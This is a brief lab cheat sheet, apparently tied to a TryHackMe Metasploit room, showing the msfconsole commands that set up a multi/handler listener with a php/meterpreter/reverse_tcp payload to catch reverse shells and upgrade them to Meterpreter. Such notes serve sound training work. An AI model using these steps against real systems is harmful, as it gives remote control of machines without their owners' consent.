# msfhandler

[![metasploitexploitation](../../../../../_badges/thmp/metasploitexploitation.svg)](https://tryhackme.com/room/metasploitexploitation)

<div class="row row-cols-lg-2"><div>

The msfconsole can be used to catch reverse shells. Some reverse shell may be upgradable to a [meterpreter](../index.md#meterpreter), which is the main goal.

* First, load the exploit, and define LHOST/LPORT 

```ps
$ msfconsole -q
msf6> use multi/handler
msf6 exploit('multi/handler')> setg LHOST tun0
msf6 exploit('multi/handler')> setg LPORT 4444
```

* Select the payload that would be appropriate

```ps
# example
msf6 exploit('multi/handler')> set PAYLOAD php/meterpreter/reverse_tcp
```
</div><div>

* Run the catcher, and wait for incoming connections.

```ps
msf6 exploit('multi/handler') > run
# WAIT
# OK session created
meterpreter> help # see what you can do
```

➡️ Your shell may not be a meterpreter, so you may try to [upgrade it](../index.md#meterpreter).
</div></div>